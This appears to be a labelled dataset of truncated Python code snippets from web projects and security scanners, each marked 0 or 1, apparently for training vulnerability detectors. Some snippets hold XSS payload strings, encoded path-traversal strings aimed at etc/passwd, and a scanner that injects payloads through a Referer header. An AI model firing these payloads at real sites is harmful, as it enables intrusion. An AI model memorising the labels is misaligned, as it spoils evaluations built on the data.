'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', ", "label": 0}, {"snippet_id": 10980, "code": "(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format", "label": 0}, {"snippet_id": 33079, "code": "'h2') contents.text='Contents' contents.tail='\\n' toc_aux=ElementTree.SubElement(toc_node, 'div',{'class': 'toc-aux'}) toc_aux.text='\\n' toc_aux.append(ul_with_the_desired_toc_entries) toc_aux.tail='\\n", "label": 0}, {"snippet_id": 54292, "code": ", values=[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1", "label": 0}, {"snippet_id": 5125, "code": " self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in", "label": 0}, {"snippet_id": 22146, "code": "', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$", "label": 0}, {"snippet_id": 53718, "code": "=application_name, DEFAULT_REGION=default_region ) def write_eb_config(dest, application_name, default_region): contents=make_eb_config(application_name, default_region) fh=open(dest, 'w') fh.write(contents", "label": 0}, {"snippet_id": 7042, "code": ".views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views", "label": 0}, {"snippet_id": 50390, "code": " sess=sess[0] cmdarray=json.loads(request.args.get('data')[0]) sess.sessionhandler.data_in(sess, **{cmdarray[0]:[cmdarray[1], cmdarray[2]]}) return '\"\"' def mode_receive(self, request): \"\"\" This is called", "label": 1}, {"snippet_id": 32401, "code": " time.sleep(1) webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension", "label": 0}, {"snippet_id": 52077, "code": ") def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type", "label": 0}, {"snippet_id": 16518, "code": ")), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern()))", "label": 0}, {"snippet_id": 12651, "code": "/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 52724, "code": ".to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id)", "label": 0}, {"snippet_id": 32311, "code": "('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path", "label": 0}, {"snippet_id": 46322, "code": "-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest", "label": 0}, {"snippet_id": 33329, "code": ".prpc_interceptor) prpc_server.add_service(access.AccessServicer()) prpc_server.add_service(api.BuildsApi()) routes +=prpc_server.get_routes() return routes def get_backend_routes(): prpc_server=prpc.Server", "label": 0}, {"snippet_id": 1737, "code": "['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result", "label": 0}, {"snippet_id": 41372, "code": "('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append(", "label": 0}, {"snippet_id": 17308, "code": " name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD", "label": 0}, {"snippet_id": 9737, "code": ", ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course", "label": 0}, {"snippet_id": 31385, "code": "=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\",", "label": 0}, {"snippet_id": 14837, "code": "\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml", "label": 0}, {"snippet_id": 52730, "code": " return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)", "label": 0}, {"snippet_id": 5536, "code": "(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", ", "label": 0}, {"snippet_id": 5376, "code": "', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut", "label": 0}, {"snippet_id": 28735, "code": " \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('", "label": 1}, {"snippet_id": 4747, "code": " 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend", "label": 0}, {"snippet_id": 35122, "code": "=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label ", "label": 0}, {"snippet_id": 52162, "code": ".id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return", "label": 1}, {"snippet_id": 26893, "code": " check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for xss in xss_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len", "label": 0}, {"snippet_id": 40625, "code": " Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) ", "label": 0}, {"snippet_id": 44398, "code": "')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response", "label": 0}, {"snippet_id": 37914, "code": " \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef", "label": 0}, {"snippet_id": 4601, "code": "'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', ", "label": 0}, {"snippet_id": 29857, "code": " to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\"", "label": 0}, {"snippet_id": 19083, "code": " Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from", "label": 0}, {"snippet_id": 34033, "code": "(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post", "label": 0}, {"snippet_id": 19783, "code": " necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test", "label": 0}, {"snippet_id": 52492, "code": "'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]", "label": 0}, {"snippet_id": 8539, "code": "(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]", "label": 0}, {"snippet_id": 51969, "code": " logging import uuid from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django", "label": 0}, {"snippet_id": 13769, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^", "label": 1}, {"snippet_id": 16560, "code": "<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),", "label": 0}, {"snippet_id": 8349, "code": ".MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 7045, "code": "(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(", "label": 0}, {"snippet_id": 46729, "code": "'claimable_benefits': Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name='core/benefit_detail.html' def get_context_data(self, *args, **kwargs): data", "label": 0}, {"snippet_id": 5308, "code": " 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr'", "label": 0}, {"snippet_id": 50101, "code": ".time() to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self.last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid", "label": 0}, {"snippet_id": 36754, "code": "\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not", "label": 0}, {"snippet_id": 24518, "code": "() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services(", "label": 0}, {"snippet_id": 24451, "code": "('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self", "label": 1}, {"snippet_id": 21631, "code": "', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 29952, "code": "\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert", "label": 0}, {"snippet_id": 8073, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 3565, "code": "=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update", "label": 0}, {"snippet_id": 8403, "code": "( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python')", "label": 0}, {"snippet_id": 1935, "code": "\"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key", "label": 0}, {"snippet_id": 1132, "code": " except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body", "label": 1}, {"snippet_id": 22941, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 45179, "code": ".objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don", "label": 0}, {"snippet_id": 26986, "code": " return def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https", "label": 0}, {"snippet_id": 30868, "code": ".ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr", "label": 0}, {"snippet_id": 15970, "code": "( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir=", "label": 0}, {"snippet_id": 11528, "code": "'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),", "label": 0}, {"snippet_id": 9445, "code": "'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading", "label": 0}, {"snippet_id": 11565, "code": "), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template", "label": 0}, {"snippet_id": 30889, "code": " \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t\tcfg", "label": 0}, {"snippet_id": 13937, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 33017, "code": ", template): contents=self._Read(os.path.join('tools', 'md_browser', template), relative_to=SRC_DIR) self.wfile.write(contents.encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def", "label": 0}, {"snippet_id": 16853, "code": "]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section", "label": 0}, {"snippet_id": 29348, "code": "-f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path')] \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo", "label": 0}, {"snippet_id": 1368, "code": " data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul", "label": 0}, {"snippet_id": 31793, "code": " as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e) \t\t if form.getvalue('bwlists_save'): \tlist=os.path.dirname(os.getcwd())", "label": 0}, {"snippet_id": 54294, "code": "[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload", "label": 0}, {"snippet_id": 22940, "code": " name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 44159, "code": "'domains']['hits']['hits'] assert len(domain_hits)==0 section_hits=inner_hits['sections']['hits']['hits'] assert len(section_hits)==1 section_content_highlight=section_hits[0]['highlight']['sections.content", "label": 0}, {"snippet_id": 26531, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc", "label": 0}, {"snippet_id": 277, "code": " fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip(", "label": 0}, {"snippet_id": 6886, "code": "'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently available backend using", "label": 0}, {"snippet_id": 40277, "code": ">\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small", "label": 0}, {"snippet_id": 2230, "code": ": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse", "label": 0}, {"snippet_id": 14726, "code": ".format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft')", "label": 0}, {"snippet_id": 29745, "code": "(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add", "label": 0}, {"snippet_id": 47921, "code": " if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile", "label": 1}, {"snippet_id": 40602, "code": "(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields", "label": 0}, {"snippet_id": 2367, "code": ",'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 40964, "code": "=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title)", "label": 0}, {"snippet_id": 20380, "code": "(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs", "label": 0}, {"snippet_id": 29244, "code": "\ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass", "label": 0}, {"snippet_id": 9063, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 41706, "code": "\"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, ", "label": 0}, {"snippet_id": 9227, "code": "<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/", "label": 1}, {"snippet_id": 3925, "code": ".insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header", "label": 1}, {"snippet_id": 50014, "code": " _RE_SCREENREADER_REGEX=re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj):", "label": 0}, {"snippet_id": 22975, "code": ".index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/", "label": 0}, {"snippet_id": 34883, "code": "\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\"", "label": 0}, {"snippet_id": 34666, "code": "=\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int", "label": 0}, {"snippet_id": 12349, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', ", "label": 0}, {"snippet_id": 8186, "code": ".openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login", "label": 0}, {"snippet_id": 13774, "code": "+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$", "label": 1}, {"snippet_id": 9478, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 28785, "code": "\tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv", "label": 0}, {"snippet_id": 13195, "code": " django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper", "label": 0}, {"snippet_id": 53560, "code": " submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]", "label": 0}, {"snippet_id": 39060, "code": "[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None", "label": 0}, {"snippet_id": 24771, "code": ".imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py", "label": 0}, {"snippet_id": 48024, "code": "'You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect(", "label": 0}, {"snippet_id": 42161, "code": "[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname", "label": 0}, {"snippet_id": 11210, "code": ".default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self", "label": 0}, {"snippet_id": 33546, "code": "=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on", "label": 0}, {"snippet_id": 45318, "code": " coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc", "label": 0}, {"snippet_id": 22977, "code": ", name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id", "label": 0}, {"snippet_id": 22390, "code": "}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware", "label": 0}, {"snippet_id": 31832, "code": "\"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e", "label": 0}, {"snippet_id": 39746, "code": ")) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t", "label": 0}, {"snippet_id": 21282, "code": "'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', ", "label": 1}, {"snippet_id": 44388, "code": "(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) 